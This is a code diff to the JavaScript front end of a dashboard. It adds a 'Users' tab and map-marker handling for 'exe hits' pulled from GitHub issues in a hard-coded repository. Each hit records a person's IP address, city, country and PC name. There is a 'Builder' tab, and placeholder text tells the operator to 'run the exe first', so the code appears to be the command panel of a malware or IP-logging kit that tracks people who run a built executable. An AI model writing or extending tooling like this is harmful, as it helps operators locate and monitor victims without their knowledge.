@@ -6,6 +6,7 @@ const ICONS = {
   logs: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 3h9l4 4v14H6z"/><path d="M15 3v4h4M9 12h7M9 16h7M9 8h3"/></svg>`,
   settings: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="3"/><path d="M19.4 13a7.97 7.97 0 0 0 0-2l2-1.5-2-3.4-2.4.7a8.06 8.06 0 0 0-1.7-1L15 3h-4l-.3 2.4a8.06 8.06 0 0 0-1.7 1l-2.4-.7-2 3.4L6.6 11a7.97 7.97 0 0 0 0 2l-2 1.5 2 3.4 2.4-.7a8.06 8.06 0 0 0 1.7 1L11 21h4l.3-2.4a8.06 8.06 0 0 0 1.7-1l2.4.7 2-3.4-2-1.6Z"/></svg>`,
   logout: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><path d="M16 17l5-5-5-5M21 12H9"/></svg>`,
+  users: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>`,
   "discord-mark": `<svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.492c-1.53-.69-3.17-1.2-4.885-1.49a.075.075 0 0 0-.079.036c-.21.369-.444.85-.608 1.23a18.566 18.566 0 0 0-5.487 0 12.36 12.36 0 0 0-.617-1.23A.077.077 0 0 0 8.562 3c-1.714.29-3.354.8-4.885 1.491a.07.07 0 0 0-.032.027C.533 9.093-.32 13.555.099 17.961a.08.08 0 0 0 .031.055 20.03 20.03 0 0 0 5.993 2.98.078.078 0 0 0 .084-.026 13.83 13.83 0 0 0 1.226-1.963.074.074 0 0 0-.041-.104 13.201 13.201 0 0 1-1.872-.878.075.075 0 0 1-.008-.125c.126-.093.252-.19.372-.287a.075.075 0 0 1 .078-.01c3.927 1.764 8.18 1.764 12.061 0a.075.075 0 0 1 .079.009c.12.098.246.195.373.288a.075.075 0 0 1-.006.125c-.598.344-1.22.635-1.873.877a.075.075 0 0 0-.04.105c.36.687.772 1.341 1.225 1.962a.077.077 0 0 0 .084.028 19.963 19.963 0 0 0 6.002-2.981.076.076 0 0 0 .032-.054c.5-5.094-.838-9.52-3.549-13.442a.06.06 0 0 0-.031-.028Z"/></svg>`,
 };
 
@@ -81,6 +82,9 @@ function wireNav() {
       if (labelSpan) setText("panel-title", labelSpan.textContent);
       if (item.dataset.target === "dashboard") {
         requestAnimationFrame(() => window.__mapWidget && window.__mapWidget.resize());
+      }
+      if (item.dataset.target === "users" && window.loadUsers) {
+        window.loadUsers();
       }
     });
   });
@@ -321,6 +325,8 @@ function initMap() {
 
 
   // ----- Load exe hits from GitHub issues -----
+  window.__markers = {};
+
   function loadHits(token) {
     if (!token) return;
     const repo = "michaelrtrtr/michaelrtrtr.github.io";
@@ -333,6 +339,9 @@ function initMap() {
     .then(r => r.json())
     .then(issues => {
       if (!Array.isArray(issues)) return;
+      // Clear old markers first
+      Object.values(window.__markers).forEach(m => m.remove());
+      window.__markers = {};
       issues.forEach(issue => {
         try {
           const hit = JSON.parse(issue.body);
@@ -352,6 +361,7 @@ function initMap() {
               </div>
             </div>
           `);
+          window.__markers[issue.number] = m;
         } catch (e) {}
       });
     })
@@ -373,6 +383,103 @@ function initMap() {
   window.__mapWidget = { resize: () => map.invalidateSize() };
 }
 
+function wireUsers() {
+  const tableWrap  = $("users-table-wrap");
+  const refreshBtn = $("users-refresh-btn");
+  const countEl    = $("users-count");
+  if (!tableWrap) return;
+
+  async function loadUsers() {
+    const token = localStorage.getItem("zx_gh_token");
+    if (!token) {
+      tableWrap.innerHTML = '<p style="color:#7b8094;">Save your GitHub token in the Builder tab first.</p>';
+      return;
+    }
+    tableWrap.innerHTML = '<p style="color:#7b8094;">Loading...</p>';
+    const repo = "michaelrtrtr/michaelrtrtr.github.io";
+    try {
+      const res = await fetch(
+        `https://api.github.com/repos/${repo}/issues?labels=hit&state=open&per_page=100`,
+        { headers: { Authorization: `token ${token}`, Accept: "application/vnd.github.v3+json" } }
+      );
+      const issues = await res.json();
+      if (!Array.isArray(issues) || issues.length === 0) {
+        tableWrap.innerHTML = '<p style="color:#7b8094;">No hits yet — run the exe first.</p>';
+        if (countEl) countEl.textContent = "";
+        return;
+      }
+      if (countEl) countEl.textContent = "· " + issues.length + " user" + (issues.length !== 1 ? "s" : "");
+
+      const table = document.createElement("table");
+      table.className = "users-table";
+      table.innerHTML = `
+        <thead><tr>
+          <th>#</th><th>IP Address</th><th>City</th><th>Country</th><th>PC Name</th><th></th>
+        </tr></thead>
+        <tbody id="users-tbody"></tbody>`;
+      tableWrap.innerHTML = "";
+      tableWrap.appendChild(table);
+      const tbody = $("users-tbody");
+
+      issues.forEach((issue, idx) => {
+        try {
+          const hit = JSON.parse(issue.body);
+          const tr = document.createElement("tr");
+          tr.id = "user-row-" + issue.number;
+          tr.innerHTML = `
+            <td style="color:#7b8094;">${idx + 1}</td>
+            <td><code style="color:#4ce0d2;background:#0d1017;padding:2px 8px;border-radius:4px;">${hit.ip || "—"}</code></td>
+            <td>${hit.city || "—"}</td>
+            <td>${hit.country || "—"}</td>
+            <td style="color:#7b8094;">—</td>
+            <td><button class="btn danger" data-issue="${issue.number}">Remove</button></td>`;
+          tbody.appendChild(tr);
+          tr.querySelector("button").addEventListener("click", () => removeUser(issue.number));
+        } catch (e) {}
+      });
+    } catch (err) {
+      tableWrap.innerHTML = '<p style="color:#ff4d6d;">Failed to load — check your token.</p>';
+    }
+  }
+
+  async function removeUser(issueNumber) {
+    const token = localStorage.getItem("zx_gh_token");
+    if (!token) return;
+    const btn = document.querySelector(`[data-issue="${issueNumber}"]`);
+    if (btn) { btn.disabled = true; btn.textContent = "Removing..."; }
+    const repo = "michaelrtrtr/michaelrtrtr.github.io";
+    try {
+      await fetch(`https://api.github.com/repos/${repo}/issues/${issueNumber}`, {
+        method: "PATCH",
+        headers: {
+          Authorization: `token ${token}`,
+          Accept: "application/vnd.github.v3+json",
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ state: "closed" }),
+      });
+      // Remove row from table
+      const row = $("user-row-" + issueNumber);
+      if (row) row.remove();
+      // Remove pin from map
+      if (window.__markers && window.__markers[issueNumber]) {
+        window.__markers[issueNumber].remove();
+        delete window.__markers[issueNumber];
+      }
+      // Update count
+      const remaining = document.querySelectorAll("#users-tbody tr").length;
+      if (countEl) countEl.textContent = remaining ? "· " + remaining + " user" + (remaining !== 1 ? "s" : "") : "";
+      showToast("Removed from map and list");
+    } catch (err) {
+      showToast("Failed to remove");
+      if (btn) { btn.disabled = false; btn.textContent = "Remove"; }
+    }
+  }
+
+  window.loadUsers = loadUsers;
+  if (refreshBtn) refreshBtn.addEventListener("click", loadUsers);
+}
+
 function safeRun(fn, label) {
   try {
     fn();
@@ -388,5 +495,6 @@ document.addEventListener("DOMContentLoaded", () => {
   safeRun(wireButtons,   "wireButtons");
   safeRun(wireSettings,  "wireSettings");
   safeRun(wireBuilder,   "wireBuilder");
+  safeRun(wireUsers,     "wireUsers");
   safeRun(initMap,       "initMap");
 });
